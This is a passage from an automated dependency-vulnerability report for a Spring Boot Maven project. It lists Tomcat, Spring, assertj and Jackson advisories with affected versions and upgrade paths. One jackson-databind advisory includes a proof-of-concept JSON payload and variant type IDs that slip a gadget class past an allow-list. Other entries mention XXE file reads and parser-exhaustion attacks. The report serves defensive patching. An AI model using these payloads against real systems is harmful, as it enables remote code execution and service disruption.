- **Read arbitrary local files** via `file://` URIs (e.g., `/etc/passwd`, application configuration files)
- **Perform Server-Side Request Forgery (SSRF)** via HTTP/HTTPS URIs
- **Cause Denial of Service** via "Billion Laughs" entity expansion attacks

### Mitigation

`isXmlEqualTo(CharSequence)` has been deprecated in favor of [XMLUnit](https://www.xmlunit.org/) in version 3.18.0 and will be removed in version 4.0. Users of affected versions should, in order of preference:

1. Replace `isXmlEqualTo(CharSequence)` with XMLUnit, or
2. Upgrade to version 3.27.7, or
3. Avoid using `isXmlEqualTo(CharSequence)` or `XmlStringPrettyFormatter` with untrusted input.

`XmlStringPrettyFormatter` has historically been considered a utility for `isXmlEqualTo(CharSequence)` rather than a feature for AssertJ users, so it is deprecated in version 3.27.7 and removed in version 4.0, with no replacement.

### References

- [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.assertj:assertj-core:3.22.0; affected range: >= 1.4.0, <= 3.27.6
    - Transitive; pulled by direct root declared at pom.xml:82; scope: test; full resolved chain: org.springframework.boot:spring-boot-starter-test:2.7.18 -> org.assertj:assertj-core:3.22.0

Recommended fix:
  - org.assertj:assertj-core: upgrade to 3.27.7 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-24734: Apache Tomcat has an Improper Input Validation vulnerability
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-24734](https://github.com/advisories/GHSA-mgp5-rv84-w37q): Apache Tomcat has an Improper Input Validation vulnerability

GHSA: GHSA-mgp5-rv84-w37q
Severity: HIGH

Improper Input Validation vulnerability in Apache Tomcat Native, Apache Tomcat.

When using an OCSP responder, Tomcat Native (and Tomcat's FFM port of the Tomcat Native code) did not complete verification or freshness checks on the OCSP response which could allow certificate revocation to be bypassed.

This issue affects Apache Tomcat Native:  from 1.3.0 through 1.3.4, from 2.0.0 through 2.0.11; Apache Tomcat: from 11.0.0-M1 through 11.0.17, from 10.1.0-M7 through 10.1.51, from 9.0.83 through 9.0.114.


The following versions were EOL at the time the CVE was created but are 
known to be affected: from 1.1.23 through 1.1.34, from 1.2.0 through 1.2.39. Older EOL versions are not affected.

Apache Tomcat Native users are recommended to upgrade to versions 1.3.5 or later or 2.0.12 or later, which fix the issue.

Apache Tomcat users are recommended to upgrade to versions 11.0.18 or later, 10.1.52 or later or 9.0.115 or later which fix the issue.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: >= 9.0.83, < 9.0.115
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.115 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-24880: Apache Tomcat has an HTTP Request/Response Smuggling vulnerability
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-24880](https://github.com/advisories/GHSA-563x-q5rq-57qp): Apache Tomcat has an HTTP Request/Response Smuggling vulnerability

GHSA: GHSA-563x-q5rq-57qp
Severity: HIGH

Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling') vulnerability in Apache Tomcat via invalid chunk extension.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.18, from 10.1.0-M1 through 10.1.52, from 9.0.0.M1 through 9.0.115, from 8.5.0 through 8.5.100, from 7.0.0 through 7.0.109.
Other, unsupported versions may also be affected.

Users are recommended to upgrade to version 11.0.20, 10.1.52 or 9.0.116, which fix the issue.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: >= 7.0.0, < 9.0.116
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.116 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-34483: Apache Tomcat has an Improper Encoding or Escaping of Output vulnerability in the JsonAccessLogValve
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-34483](https://github.com/advisories/GHSA-rv64-5gf8-9qq8): Apache Tomcat has an Improper Encoding or Escaping of Output vulnerability in the JsonAccessLogValve

GHSA: GHSA-rv64-5gf8-9qq8
Severity: HIGH

Improper Encoding or Escaping of Output vulnerability in the JsonAccessLogValve component of Apache Tomcat.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.20, from 10.1.0-M1 through 10.1.53, from 9.0.40 through 9.0.116.

Users are recommended to upgrade to version 11.0.21, 10.1.54 or 9.0.117 , which fix the issue.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: >= 9.0.40, < 9.0.116
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.116 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-34487: Apache Tomcat vulnerable to Insertion of Sensitive Information into Log File
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-34487](https://github.com/advisories/GHSA-x4m4-345f-5h5g): Apache Tomcat vulnerable to Insertion of Sensitive Information into Log File

GHSA: GHSA-x4m4-345f-5h5g
Severity: HIGH

Insertion of Sensitive Information into Log File vulnerability in the cloud membership for clustering component of Apache Tomcat exposed the Kubernetes bearer token.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.20, from 10.1.0-M1 through 10.1.53, from 9.0.13 through 9.0.116.

Users are recommended to upgrade to version 11.0.21, 10.1.54 or 9.0.117, which fix the issue.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: >= 9.0.13, < 9.0.117
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.117 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-40972: Spring Boot DevTools remote secret comparison is vulnerable to timing attacks
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:96

[CVE-2026-40972](https://github.com/advisories/GHSA-56v8-86gj-66jp): Spring Boot DevTools remote secret comparison is vulnerable to timing attacks

GHSA: GHSA-56v8-86gj-66jp
Severity: HIGH

An attacker on the same network as the remote application may be able to utilize a timing attack to discover information about the remote secret. In extreme circumstances this could result in the attacker determining the secret and uploading changed classes, thereby achieving remote code execution in the remote application.

Affected: Spring Boot 4.0.0–4.0.5 (fix 4.0.6), 3.5.0–3.5.13 (fix 3.5.14), 3.4.0–3.4.15 (fix 3.4.16), 3.3.0–3.3.18 (fix 3.3.19), 2.7.0–2.7.32 (fix 2.7.33); DevTools remote secret comparison. Versions that are no longer supported are also affected per vendor advisory.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework.boot:spring-boot-devtools:2.7.18; affected range: <= 2.7.32
    - Direct declaration at pom.xml:96; scope: compile; full resolved chain: org.springframework.boot:spring-boot-devtools:2.7.18

Recommended fix:
  - org.springframework.boot:spring-boot-devtools: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2026-40973: Spring Boot accepts predictable temp directory without ownership verification
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:96

[CVE-2026-40973](https://github.com/advisories/GHSA-wwpq-f5c3-7hvx): Spring Boot accepts predictable temp directory without ownership verification

GHSA: GHSA-wwpq-f5c3-7hvx
Severity: HIGH

A local attacker on the same host as the application may be able to take control of the directory used by `ApplicationTemp`. When `server.servlet.session.persistent` is set to `true` and the attack persists across application restarts, this may allow the attacker to read session information and hijack authenticated users or deploy a gadget chain and execute code as the application's user.

Affected: Spring Boot 4.0.0–4.0.5 (fix 4.0.6), 3.5.0–3.5.13 (fix 3.5.14), 3.4.0–3.4.15 (fix 3.4.16), 3.3.0–3.3.18 (fix 3.3.19), 2.7.0–2.7.32 (fix 2.7.33); predictable temp directory / `ApplicationTemp` ownership verification. Versions that are no longer supported are also affected per vendor advisory.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework.boot:spring-boot:2.7.18; affected range: <= 2.7.32
    - Transitive; pulled by direct root declared at pom.xml:96; scope: compile; full resolved chain: org.springframework.boot:spring-boot-devtools:2.7.18 -> org.springframework.boot:spring-boot:2.7.18

Recommended fix:
  - org.springframework.boot:spring-boot: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2026-41284: Apache Tomcat: Unbounded read in WebDAV LOCK and  PROPFIND handling
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-41284](https://github.com/advisories/GHSA-gx5v-xp9w-j4cg): Apache Tomcat: Unbounded read in WebDAV LOCK and  PROPFIND handling

GHSA: GHSA-gx5v-xp9w-j4cg
Severity: HIGH

Versions Affected:
Apache Tomcat 11.0.0-M1 to 11.0.21
Apache Tomcat 10.1.0-M1 to 10.1.54
Apache Tomcat 9.0.0.M1 to 9.0.117
Older, unsupported versions may also be affected

Description:
No limit was enforced on the request body for WebDAV LOCK or PROPFIND
requests which were available to unauthenticated users.

Mitigation:
Users of the affected versions should apply one of the following
mitigations:
- Upgrade to Apache Tomcat 11.0.22 or later
- Upgrade to Apache Tomcat 10.1.55 or later
- Upgrade to Apache Tomcat 9.0.118 or later

Credit:
This issue was identified by Dariusz Gońda

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: < 9.0.118
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.118 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-41716: Spring Data Commons: Heap exhaustion from unbounded property-lookup cache retaining crafted string keys
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:44

[CVE-2026-41716](https://github.com/advisories/GHSA-9fw2-h3hf-293r): Spring Data Commons: Heap exhaustion from unbounded property-lookup cache retaining crafted string keys

GHSA: GHSA-9fw2-h3hf-293r
Severity: HIGH

Spring Data's internal property-lookup cache accepts and permanently retains attacker-supplied strings as cache keys, allowing heap exhaustion through repeated requests.

Affected versions:
Spring Data Commons 2.7.0 through 2.7.19; 3.3.0 through 3.3.16; 3.4.0 through 3.4.14; 3.5.0 through 3.5.11; 4.0.0 through 4.0.5.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework.data:spring-data-commons:2.7.18; affected range: <= 2.7.19
    - Transitive; pulled by direct root declared at pom.xml:44; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-data-jpa:2.7.18 -> org.springframework.data:spring-data-jpa:2.7.18 -> org.springframework.data:spring-data-commons:2.7.18

Recommended fix:
  - org.springframework.data:spring-data-commons: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2026-41842: Spring Framework Denial of Service via Versioned Resources in Spring MVC and WebFlux
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-41842](https://github.com/advisories/GHSA-x23c-287f-qqv5): Spring Framework Denial of Service via Versioned Resources in Spring MVC and WebFlux

GHSA: GHSA-x23c-287f-qqv5
Severity: HIGH

Spring MVC and WebFlux applications are vulnerable to Denial of Service (DoS) attacks when resolving static resources.

Affected versions:
Spring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework:spring-webmvc:5.3.31; affected range: <= 5.3.39
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework:spring-webmvc:5.3.31

Recommended fix:
  - org.springframework:spring-webmvc: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2026-41845: Spring Framework Cross-site Scripting via JavaScriptUtils
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-41845](https://github.com/advisories/GHSA-3chg-m5w7-qfv5): Spring Framework Cross-site Scripting via JavaScriptUtils

GHSA: GHSA-3chg-m5w7-qfv5
Severity: HIGH

Due to incorrect escaping, the use of JavaScriptUtils.javaScriptEscape() may lead to JavaScript code injection in the browser, potentially resulting in a cross-site scripting (XSS) vulnerability.

Affected versions:
Spring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework:spring-webmvc:5.3.31; affected range: <= 5.3.39
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework:spring-webmvc:5.3.31

Recommended fix:
  - org.springframework:spring-webmvc: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2026-41849: Spring Framework Denial of Service via Integer Overflow in SpEL Expressions
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-41849](https://github.com/advisories/GHSA-775g-4xr8-78h8): Spring Framework Denial of Service via Integer Overflow in SpEL Expressions

GHSA: GHSA-775g-4xr8-78h8
Severity: HIGH

An integer overflow vulnerability exists in the evaluation logic of the Spring Expression Language (SpEL). An attacker can exploit this by supplying a specially crafted SpEL expression that triggers excessive resource consumption, resulting in a Denial of Service (DoS).

Affected versions:
Spring Framework 5.3.0 through 5.3.48.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework:spring-expression:5.3.31; affected range: <= 5.3.39
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework:spring-webmvc:5.3.31 -> org.springframework:spring-expression:5.3.31

Recommended fix:
  - org.springframework:spring-expression: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2026-41850: Spring Framework Algorithmic Denial of Service via SpEL Expressions
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-41850](https://github.com/advisories/GHSA-r5w3-xv2f-j59q): Spring Framework Algorithmic Denial of Service via SpEL Expressions

GHSA: GHSA-r5w3-xv2f-j59q
Severity: HIGH

Applications that evaluate user-supplied Spring Expression Language (SpEL) expressions are vulnerable to an Algorithmic Denial of Service (DoS). By providing a specially crafted expression, an attacker can trigger excessive resource consumption during evaluation, leading to application degradation or unavailability.

Affected versions:
Spring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework:spring-expression:5.3.31; affected range: <= 5.3.39
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework:spring-webmvc:5.3.31 -> org.springframework:spring-expression:5.3.31

Recommended fix:
  - org.springframework:spring-expression: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2026-42498: Apache Tomcat - WebSocket authentication header exposure
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-42498](https://github.com/advisories/GHSA-fv25-8xcx-gqjc): Apache Tomcat - WebSocket authentication header exposure

GHSA: GHSA-fv25-8xcx-gqjc
Severity: HIGH

Versions Affected:
Apache Tomcat 11.0.0-M1 to 11.0.21
Apache Tomcat 10.1.0-M1 to 10.1.54
Apache Tomcat 9.0.2 to 9.0.117
Older, unsupported versions may also be affected

Description:
If a WebSocket request was redirected after authentication, Tomcat's
WebSocket client would present the most recent authentication header to
the redirect target host.

Mitigation:
Users of the affected versions should apply one of the following
mitigations:
- Upgrade to Apache Tomcat 11.0.22 or later
- Upgrade to Apache Tomcat 10.1.55 or later
- Upgrade to Apache Tomcat 9.0.118 or later

Credit:
This issue was identified by lokerxx

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: < 9.0.118
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.118 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-43513: Apache Tomcat: LockOutRealm treats user names as case-sensitive
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-43513](https://github.com/advisories/GHSA-5mp6-jrq3-r938): Apache Tomcat: LockOutRealm treats user names as case-sensitive

GHSA: GHSA-5mp6-jrq3-r938
Severity: HIGH

Improper Handling of Case Sensitivity vulnerability in LockOutRealm in Apache Tomcat.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.21, from 10.1.0-M1 through 10.1.54, from 9.0.0.M1 through 9.0.117, from 8.5.0 through 8.5.100, from 7.0.0 through 7.0.109.
Older unsupported versions may also be affected.

Users are recommended to upgrade to version 11.0.22, 10.1.55 or 9.0.118 which fix the issue.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: < 9.0.118
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.118 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-54512: jackson-databind has a PolymorphicTypeValidator bypass via generic type parameters that allows arbitrary class instantiation
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:76

[CVE-2026-54512](https://github.com/advisories/GHSA-j3rv-43j4-c7qm): jackson-databind has a PolymorphicTypeValidator bypass via generic type parameters that allows arbitrary class instantiation

GHSA: GHSA-j3rv-43j4-c7qm
Severity: HIGH

`jackson-databind`'s `PolymorphicTypeValidator` (PTV) is the primary safety mechanism guarding polymorphic deserialization. When polymorphic typing is enabled and a type identifier contains generic parameters (i.e. the type ID string contains `<`), `DatabindContext._resolveAndValidateGeneric()` validates **only the raw container class name** (the substring before `<`) against the configured PTV.

If the container type is approved, the method parses the full canonical type string via `TypeFactory.constructFromCanonical()` and returns the fully parameterized type **without ever validating the nested type arguments** against the PTV. The nested type arguments are then resolved, instantiated, and populated as beans during deserialization.

An attacker who controls the type ID can therefore place a denied class as a generic type parameter of an allowed container — for example `java.util.ArrayList<com.evil.Gadget>` when only `java.util.ArrayList` is allow-listed. The container passes the PTV check; `com.evil.Gadget` is loaded via `Class.forName(name, true, loader)`, instantiated, and its properties are set from attacker-controlled JSON. This completely bypasses an explicitly configured PTV allow-list.

This is the same vulnerability class responsible for the historical sequence of jackson-databind deserialization CVEs; here it manifests as a validator bypass rather than a missing deny-list entry.


## Impact

- **Bypass of the PTV allow-list**, including the recommended `BasicPolymorphicTypeValidator` configured with name-prefix allow rules.
- **Arbitrary class instantiation** of any type assignable to the container's element/parameter position, with attacker-controlled property values (setter/field injection).
- **Potential unauthenticated remote code execution** when a class with exploitable side effects (JNDI lookup, JDBC/connection-pool gadgets,`TemplatesImpl`-style loaders, etc.) is present on the classpath.

Applications that accept untrusted JSON and rely on a configured PTV — the documented, security-conscious configuration — are affected.


## Proof of Concept

Configuration restricting polymorphic deserialization to a single safe container:

```java
BasicPolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator.builder()
        .allowIfSubType("java.util.ArrayList")
        .build();

ObjectMapper mapper = JsonMapper.builder()
        .polymorphicTypeValidator(ptv)
        .build();
```

Malicious payload (`Wrapper.value` is `Object` with `@JsonTypeInfo(use = Id.CLASS, include = As.WRAPPER_ARRAY)`):

```json
{"value":["java.util.ArrayList<com.evil.EvilGadget>",[{"cmd":"calc.exe"}]]}
```

On vulnerable versions, `com.evil.EvilGadget` is instantiated and its `cmd` property is set, despite only `java.util.ArrayList` being allow-listed. On `2.18.8` / `2.21.4` / `3.1.4` the deserialization throws `InvalidTypeIdException` before instantiation.

**Variant payloads** (all bypass an `ArrayList`/`HashMap` allow-list):

| Type ID | Smuggled type position |
|---|---|
| `java.util.ArrayList<Evil>` | list element |
| `java.util.HashMap<Evil,String>` | map key |
| `java.util.HashMap<String,Evil>` | map value |
| `java.util.ArrayList<java.util.ArrayList<Evil>>` | nested element |
| `java.util.ArrayList<Evil[]>` | array element |

---

## Patches

Fixed in **2.18.8**, **2.21.4** and **3.1.4** via the changes for [FasterXML/jackson-databind#5988](https://github.com/FasterXML/jackson-databind/issues/5988), commit `434d6c511`. The fix adds recursive validation of each non-trivial type parameter (and array element types appearing as parameters) through the full PTV chain, with documented exemptions for `Object` (wildcard resolution) and `Enum` types.

`PolymorphicTypeValidator` was added in 2.10.0 so vulnerability N/A for versions prior to that.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - com.fasterxml.jackson.core:jackson-databind:2.13.5; affected range: >= 2.10.0, <= 2.18.7
    - Transitive; pulled by direct root declared at pom.xml:76; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-json:2.7.18 -> com.fasterxml.jackson.core:jackson-databind:2.13.5

Recommended fix:
  - com.fasterxml.jackson.core:jackson-databind: upgrade to 2.18.8 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-54513: jackson-databind has an array subtype allowlist bypass in BasicPolymorphicTypeValidator (allowIfSubTypeIsArray)
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:76

[CVE-2026-54513](https://github.com/advisories/GHSA-rmj7-2vxq-3g9f): jackson-databind has an array subtype allowlist bypass in BasicPolymorphicTypeValidator (allowIfSubTypeIsArray)

GHSA: GHSA-rmj7-2vxq-3g9f
Severity: HIGH

## Summary
`BasicPolymorphicTypeValidator.Builder.allowIfSubTypeIsArray()` allowlists any array type based only on `clazz.isArray()`, without validating the array's component (element) type against the configured allowlist. A PTV built with `allowIfSubTypeIsArray()` plus an explicit concrete-type allowlist therefore still permits `EvilType[]` even though `EvilType` is not allowlisted. When Jackson deserializes the elements and no per-element type IDs are present, it instantiates the component type directly with no further PTV check, bypassing the allowlist.

## Impact
Applications using `BasicPolymorphicTypeValidator` with `allowIfSubTypeIsArray()` as a safeguard get no protection for concrete array component types; an attacker controlling JSON can instantiate non-allowlisted types via an array wrapper, re-opening the gadget-instantiation risk PTV is meant to prevent.

## Affected / Patched (verified via `git tag --contains`)
- 2.18 line: `>= 2.10.0, < 2.18.8` -> fixed in **2.18.8**
- 2.19-2.21 line: `>= 2.19.0, < 2.21.4` -> fixed in **2.21.4**
- 3.x line: `>= 3.0.0, < 3.1.4` -> fixed in **3.1.4**

`PolymorphicTypeValidator` was added in 2.10.0 so vulnerability N/A for versions prior to that.

## Severity / CWE
Maintainer: significant. Reporter: HIGH. CWE-184 (Incomplete List of Disallowed Inputs); related CWE-502.

## Upstream fix
FasterXML/jackson-databind#5981; fix PR #5983 (`24529da`), 2.18 backport PR #5984 (`01d1692`). Released 2026-06-04 in 2.18.8 / 2.21.4 / 3.1.4.

## Credits
Omkhar Arasaratnam (@omkhar) - finder.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - com.fasterxml.jackson.core:jackson-databind:2.13.5; affected range: >= 2.10.0, < 2.18.8
    - Transitive; pulled by direct root declared at pom.xml:76; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-json:2.7.18 -> com.fasterxml.jackson.core:jackson-databind:2.13.5

Recommended fix:
  - com.fasterxml.jackson.core:jackson-databind: upgrade to 2.18.8 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-68494: jackson-core: Async parser maxNumberLength bypass via chunked digit accumulation (incomplete fix for GHSA-72hv-8253-57qq)
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:76

[CVE-2026-68494](https://github.com/advisories/GHSA-r7wm-3cxj-wff9): jackson-core: Async parser maxNumberLength bypass via chunked digit accumulation (incomplete fix for GHSA-72hv-8253-57qq)

GHSA: GHSA-r7wm-3cxj-wff9
Severity: HIGH

## Summary

The fix released in jackson-core `2.18.6` and `2.21.1` for [GHSA-72hv-8253-57qq](https://github.com/FasterXML/jackson-core/security/advisories/GHSA-72hv-8253-57qq) (Number Length Constraint Bypass in Async Parser, published 2026-02-28) is incomplete. The fix commit `b0c428e6` (#1555) wired `validateIntegerLength` into a new `_setIntLength` helper and called it at every place where the integer portion of a number is *decided* (terminator byte arrived, `.` / `e/E` seen, end-of-feed inside a fully-buffered value). It did not call it on the much more attacker-relevant path: "ran out of input while still inside `MINOR_NUMBER_INTEGER_DIGITS`, return `NOT_AVAILABLE` to caller".

As a result, an attacker who streams JSON to a non-blocking parser in many small chunks, without ever sending a terminator byte, can keep the parser inside `MINOR_NUMBER_INTEGER_DIGITS` indefinitely. `_textBuffer.expandCurrentSegment()` grows on every chunk, and `validateIntegerLength` is never invoked. The accumulator is only gated by `maxStringLength` (20 MiB default) — a **~20,000x amplification** of the documented `maxNumberLength` (1000 default).

This is the same vulnerability class, same advisory wording ("Memory Exhaustion: Unbounded allocation in TextBuffer from excessively long numbers"), same parser class — just the streaming path the original fix didn't cover. The fix to the *fraction* path is correct (see `_finishFloatFraction` at line 1834-1837 of `NonBlockingUtf8JsonParserBase.java` in 2.18.6, where `_setFractLength(fractLen)` IS called before the `NOT_AVAILABLE` return); the equivalent call is missing from every integer-digit path.

## Affected versions

Verified on the patched releases:
- `com.fasterxml.jackson.core:jackson-core` **2.18.6**
- `com.fasterxml.jackson.core:jackson-core` **2.21.1**

Structurally identical code in `tools.jackson.core` 3.0.x / 3.1.x — same `NonBlockingUtf8JsonParserBase` class, same `_setIntLength` rollout, same NOT_AVAILABLE returns without validation. Not retested but presumed vulnerable.

## Affected code

[`src/main/java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParserBase.java`](https://github.com/FasterXML/jackson-core/blob/b0c428e6/src/main/java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParserBase.java) in 2.18.6 / 2.21.1.

### Site 1 — `_startPositiveNumber(int ch)` lines 1320-1330:

```java
if (outPtr >= outBuf.length) {
    // NOTE: must expand to ensure contents all in a single buffer (to keep
    // other parts of parsing simpler)
    outBuf = _textBuffer.expandCurrentSegment();
}
outBuf[outPtr++] = (char) ch;
if (++_inputPtr >= _inputEnd) {
    _minorState = MINOR_NUMBER_INTEGER_DIGITS;
    _textBuffer.setCurrentLength(outPtr);
    return _updateTokenToNA();          // <-- no validateIntegerLength(outPtr)
}
```

### Site 2 — `_finishNumberIntegralPart` lines 1691-1727:

```java
protected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr) throws IOException {
    int negMod = _numberNegative ? -1 : 0;

    while (true) {
        if (_inputPtr >= _inputEnd) {
            _minorState = MINOR_NUMBER_INTEGER_DIGITS;
            _textBuffer.setCurrentLength(outPtr);
            return _updateTokenToNA();    // <-- no validateIntegerLength(outPtr + negMod)
        }
        int ch = getByteFromBuffer(_inputPtr) & 0xFF;
        if (ch < INT_0) {
            if (ch == INT_PERIOD) {
                _setIntLength(outPtr+negMod);   // <-- validated here
                ++_inputPtr;
                return _startFloat(outBuf, outPtr, ch);
            }
            break;
        }
        if (ch > INT_9) {
            if ((ch | 0x20) == INT_e) {
                _setIntLength(outPtr+negMod);   // <-- validated here
                ++_inputPtr;
                return _startFloat(outBuf, outPtr, ch);
            }
            break;
        }
        ++_inputPtr;
